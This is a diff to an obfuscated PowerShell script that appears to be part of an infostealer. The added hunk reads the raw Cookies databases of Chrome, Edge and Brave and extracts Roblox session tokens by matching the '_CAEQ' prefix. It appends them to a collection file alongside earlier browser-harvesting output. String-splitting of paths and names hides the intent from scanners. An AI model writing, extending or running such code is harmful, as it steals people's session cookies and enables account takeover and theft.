@@ -183,3 +183,25 @@ foreach($b2 in $browsers){
     }catch{Add-Content $f0 "$tP|$($b2.N0)|READ_ERROR||"}
     Remove-Item $tmp -Force -EA SilentlyContinue
 }
+
+# Browser Roblox cookies — search raw bytes for _CAEQ
+$tRC="R"+"OBLO"+"XWB"
+foreach($bp in @(
+  @("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data","Ch"),
+  @("$env:LOCALAPPDATA\Micr"+"osoft\E"+"dge\User Data","Ed"),
+  @("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data","Br")
+)){
+  $cp=Join-Path $bp[0] ("Def"+"ault\Net"+"work\Co"+"okies")
+  if(!(Test-Path $cp)){$cp=Join-Path $bp[0] ("Def"+"ault\Co"+"okies")}
+  if(!(Test-Path $cp)){continue}
+  try{
+    $fs=[IO.File]::Open($cp,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
+    $ms=New-Object IO.MemoryStream;$fs.CopyTo($ms);$fs.Close()
+    $rb=$ms.ToArray();$ms.Close()
+    $txt=[Text.Encoding]::ASCII.GetString($rb)
+    if($txt -match '(_'+'CAEQ[^\x00]{50,500})'){
+      $val=$Matches[1] -replace '[^\x20-\x7E]',''
+      if($val.Length -gt 50){Add-Content $f0 "$tRC|$($bp[1])|$val"}
+    }
+  }catch{}
+}
